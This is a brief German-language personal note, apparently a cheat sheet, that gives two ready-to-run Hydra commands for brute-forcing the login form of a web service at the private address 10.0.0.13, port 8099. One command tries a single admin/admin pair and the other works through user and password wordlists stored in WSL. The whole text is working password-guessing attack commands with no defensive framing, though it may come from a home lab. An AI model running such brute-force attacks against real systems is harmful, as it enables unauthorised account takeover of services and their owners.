- WSL starten, dann:
hydra -l admin -p admin -s 8099 10.0.0.13 http-post-form "/login:username=^USER^&password=^PASS^:Please log in"

- oder mit Passwort Liste: (Liste liegt in WSL unter ~ oder /home/manu)
hydra -L user.list -P pass.list -s 8099 10.0.0.13 http-post-form "/login:username=^USER^&password=^PASS^:Please log in"
